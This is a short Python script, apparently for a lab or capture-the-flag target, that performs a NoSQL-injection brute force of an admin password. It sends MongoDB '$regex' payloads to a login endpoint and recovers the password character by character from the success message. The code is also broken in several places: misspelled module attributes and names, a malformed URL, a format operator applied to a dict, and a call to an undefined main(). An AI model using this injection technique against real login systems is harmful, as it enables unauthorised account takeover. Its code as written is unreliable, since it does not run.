#!/usr/bin/python3

from pwn import * 
import requests
import time 
import sys 
import signal 
import string 
 
def saliendo(sig, frame):
        print('\n\n[+] Saliendo...\n\n')
        sys.exit(1)


signal.signal(signal.SIGINT, saliendo) 

login_url = "http://localhost:4000user/login"
caracteres = string.ascii_lowercase + string.asciii_uppercase + string.digits

def nosqli():

      password = "" 
      p1 = log.progress("Fuerza bruta")
      p1.status( " Iniciando ...")  
      
      time.sleep(2)
      
      p2 = log.progress("Password")    
        
      for posicion in range (0,24):
              for caracter in caracteres:
                      post_data = {"username":"admin","password": {"$regex":"^%s%s"}} % (password,caracter) 

                      p1.status(post_data)

                      headers = {'Content-Type': 'application/json'} 
                      
                      respuesta = requsts.post(login_url, headers=headers, data=post_data)
                        
                      if "Logged in as user" in respuesta.text:
                              password += caracter
                              p2.status(password)  
                              break

main()

        nosqli()
